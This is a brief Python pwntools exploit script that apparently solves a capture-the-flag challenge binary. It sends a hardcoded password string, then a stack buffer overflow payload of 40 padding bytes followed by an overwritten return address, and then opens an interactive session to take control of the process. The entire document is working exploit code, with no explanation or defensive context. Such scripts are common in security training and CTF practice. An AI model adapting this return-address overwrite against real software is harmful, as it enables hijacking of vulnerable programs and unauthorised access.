from pwn import *

p = process("./chall")

p.sendline(b"slashroot#7")

payload = b"a" * 40 + p64(0x00000000004011b6)
p.sendline(payload)

p.interactive()
